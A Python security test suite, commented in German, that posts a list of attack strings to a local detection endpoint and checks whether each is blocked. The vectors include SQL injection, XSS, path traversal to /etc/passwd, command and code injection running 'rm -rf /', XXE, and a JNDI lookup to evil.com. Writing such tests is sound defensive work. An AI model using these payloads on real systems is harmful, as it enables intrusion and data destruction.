#!/usr/bin/env python3
"""
Security Test Suite - Orchestrator Service
===========================================

Testet Grenzwerte und schädliche Eingaben.
Validiert Input-Validation und Security-Boundaries.

Usage:
    python -m tests.security_test
    python -m tests.security_test --test input_validation
"""

import asyncio
import aiohttp
import argparse
import json
from typing import List, Dict, Optional
from datetime import datetime
from pathlib import Path
from dataclasses import dataclass, asdict
import sys

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))


@dataclass
class SecurityTestResult:
    """Ergebnis eines Security-Tests."""
    test_name: str
    timestamp: str
    passed: bool
    blocked: bool
    risk_score: float
    details: Dict
    error: Optional[str] = None


class SecurityTester:
    """Security-Tester für Orchestrator Service."""

    TEST_VECTORS = [
        # SQL Injection
        {
            "name": "SQL Injection - Basic",
            "text": "SELECT * FROM users",
            "expected_block": True,
            "category": "SQL Injection"
        },
        {
            "name": "SQL Injection - UNION",
            "text": "SELECT * FROM users UNION SELECT * FROM passwords",
            "expected_block": True,
            "category": "SQL Injection"
        },
        {
            "name": "SQL Injection - DROP",
            "text": "DROP TABLE users;",
            "expected_block": True,
            "category": "SQL Injection"
        },
        # XSS
        {
            "name": "XSS - Basic Script",
            "text": "<script>alert('xss')</script>",
            "expected_block": True,
            "category": "XSS"
        },
        {
            "name": "XSS - Event Handler",
            "text": "<img src=x onerror=alert(1)>",
            "expected_block": True,
            "category": "XSS"
        },
        {
            "name": "XSS - SVG",
            "text": "<svg onload=alert(1)>",
            "expected_block": True,
            "category": "XSS"
        },
        # Path Traversal
        {
            "name": "Path Traversal - Basic",
            "text": "../../../etc/passwd",
            "expected_block": True,
            "category": "Path Traversal"
        },
        {
            "name": "Path Traversal - Encoded",
            "text": "..%2F..%2F..%2Fetc%2Fpasswd",
            "expected_block": True,
            "category": "Path Traversal"
        },
        # Command Injection
        {
            "name": "Command Injection - Basic",
            "text": "; ls -la;",
            "expected_block": True,
            "category": "Command Injection"
        },
        {
            "name": "Command Injection - Pipe",
            "text": "| cat /etc/passwd",
            "expected_block": True,
            "category": "Command Injection"
        },
        {
            "name": "Command Injection - Backtick",
            "text": "`rm -rf /`",
            "expected_block": True,
            "category": "Command Injection"
        },
        # Buffer Overflow
        {
            "name": "Buffer Overflow - Large String",
            "text": "A" * 10000,
            "expected_block": False,  # Should handle gracefully, not necessarily block
            "category": "Buffer Overflow"
        },
        {
            "name": "Buffer Overflow - Very Large",
            "text": "A" * 100000,
            "expected_block": False,
            "category": "Buffer Overflow"
        },
        # Malformed JSON
        {
            "name": "Malformed JSON - Missing Bracket",
            "text": '{"malformed": true',
            "expected_block": False,  # Should handle gracefully
            "category": "Malformed Input"
        },
        # Unicode Bombs
        {
            "name": "Unicode Bomb - Zero Width",
            "text": "\ufeff" * 1000,
            "expected_block": True,
            "category": "Unicode Bomb"
        },
        {
            "name": "Unicode Bomb - Combining",
            "text": "a" + "\u0300" * 1000,
            "expected_block": False,  # Should normalize, not necessarily block
            "category": "Unicode Bomb"
        },
        # Code Injection
        {
            "name": "Code Injection - Python",
            "text": "import os; os.system('rm -rf /')",
            "expected_block": True,
            "category": "Code Injection"
        },
        {
            "name": "Code Injection - JavaScript",
            "text": "eval('alert(1)')",
            "expected_block": True,
            "category": "Code Injection"
        },
        # LDAP Injection
        {
            "name": "LDAP Injection",
            "text": "*)(uid=*))(|(uid=*",
            "expected_block": True,
            "category": "LDAP Injection"
        },
        # JNDI Injection
        {
            "name": "JNDI Injection",
            "text": "${jndi:ldap://evil.com/a}",
            "expected_block": True,
            "category": "JNDI Injection"
        },
        # XXE
        {
            "name": "XXE - Basic",
            "text": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "expected_block": True,
            "category": "XXE"
        }
    ]

    def __init__(self, base_url: str = "http://localhost:8001"):
        self.base_url = base_url

    async def test_input_validation(self) -> List[SecurityTestResult]:
        """Testet Grenzwerte und schädliche Eingaben."""
        print("\n🔒 Testing Input Validation...")
        
        results = []
        
        async with aiohttp.ClientSession() as session:
            for i, vector in enumerate(self.TEST_VECTORS, 1):
                print(f"   [{i}/{len(self.TEST_VECTORS)}] {vector['name']}")
                
                try:
                    async with session.post(
                        f"{self.base_url}/api/v1/route-and-detect",
                        json={
                            "text": vector["text"],
                            "context": {
                                "source_tool": "general",
                                "user_risk_tier": 1
                            }
                        },
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as resp:
                        status = resp.status
                        if status == 200:
                            response_data = await resp.json()
                            # Response-Struktur: {"success": true, "data": {"blocked": ..., "risk_score": ...}}
                            data = response_data.get("data", {})
                            risk_score = data.get("risk_score", 0.0)
                            blocked = data.get("blocked", False)
                            
                            # Check if result matches expectation
                            expected_block = vector.get("expected_block", True)
                            passed = (blocked == expected_block) or (not expected_block and risk_score < 0.5)
                            
                            result = SecurityTestResult(
                                test_name=vector["name"],
                                timestamp=datetime.utcnow().isoformat(),
                                passed=passed,
                                blocked=blocked,
                                risk_score=risk_score,
                                details={
                                    "category": vector["category"],
                                    "expected_block": expected_block,
                                    "status": status,
                                    "blocked": blocked
                                }
                            )
                        else:
                            # Request failed - might be intentional for some tests
                            result = SecurityTestResult(
                                test_name=vector["name"],
                                timestamp=datetime.utcnow().isoformat(),
                                passed=False,
                                blocked=True,
                                risk_score=1.0,
                                details={
                                    "category": vector["category"],
                                    "expected_block": vector.get("expected_block", True),
                                    "status": status
                                },
                                error=f"HTTP {status}"
                            )
                        
                        results.append(result)
                        
                except asyncio.TimeoutError:
                    result = SecurityTestResult(
                        test_name=vector["name"],
                        timestamp=datetime.utcnow().isoformat(),
                        passed=False,
                        blocked=False,
                        risk_score=0.0,
                        details={
                            "category": vector["category"],
                            "expected_block": vector.get("expected_block", True)
                        },
                        error="Timeout"
                    )
                    results.append(result)
                except Exception as e:
                    result = SecurityTestResult(
                        test_name=vector["name"],
                        timestamp=datetime.utcnow().isoformat(),
                        passed=False,
                        blocked=False,
                        risk_score=0.0,
                        details={
                            "category": vector["category"],
                            "expected_block": vector.get("expected_block", True)
                        },
                        error=str(e)
                    )
                    results.append(result)
        
        return results

    def print_results(self, results: List[SecurityTestResult]):
        """Druckt Test-Ergebnisse."""
        print("\n" + "=" * 80)
        print("🔒 SECURITY TEST RESULTS")
        print("=" * 80)
        
        passed_count = sum(1 for r in results if r.passed)
        blocked_count = sum(1 for r in results if r.blocked)
        total_count = len(results)
        
        # Group by category
        by_category = {}
        for result in results:
            category = result.details.get("category", "Unknown")
            if category not in by_category:
                by_category[category] = {"total": 0, "passed": 0, "blocked": 0}
            by_category[category]["total"] += 1
            if result.passed:
                by_category[category]["passed"] += 1
            if result.blocked:
                by_category[category]["blocked"] += 1
        
        print(f"\n📊 Summary:")
        print(f"   Total Tests: {total_count}")
        print(f"   Passed: {passed_count} ({passed_count/total_count*100:.1f}%)")
        print(f"   Blocked: {blocked_count} ({blocked_count/total_count*100:.1f}%)")
        
        print(f"\n📋 By Category:")
        for category, stats in by_category.items():
            print(f"   {category}:")
            print(f"      Total: {stats['total']}, Passed: {stats['passed']}, Blocked: {stats['blocked']}")
        
        print(f"\n📝 Detailed Results:")
        for result in results:
            status = "✅" if result.passed else "❌"
            block_status = "🚫 BLOCKED" if result.blocked else "✅ ALLOWED"
            print(f"   {status} {result.test_name}: {block_status} (risk={result.risk_score:.3f})")
            if result.error:
                print(f"      Error: {result.error}")
        
        print("\n" + "=" * 80)
        
        if passed_count == total_count:
            print("🎉 ALL SECURITY TESTS PASSED!")
        else:
            print(f"⚠️  {total_count - passed_count} TESTS FAILED")
        
        print("=" * 80 + "\n")


async def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(description="Security Test for Orchestrator Service")
    parser.add_argument(
        "--url",
        type=str,
        default="http://localhost:8001",
        help="Base URL of orchestrator service (default: http://localhost:8001)"
    )
    parser.add_argument(
        "--output",
        type=str,
        help="Output JSON file path (optional)"
    )
    
    args = parser.parse_args()
    
    tester = SecurityTester(base_url=args.url)
    results = await tester.test_input_validation()
    
    tester.print_results(results)
    
    # Save to JSON if requested
    if args.output:
        output_path = Path(args.output)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        with open(output_path, 'w') as f:
            json.dump([asdict(r) for r in results], f, indent=2)
        print(f"📄 Results saved to: {output_path}")


if __name__ == "__main__":
    asyncio.run(main())

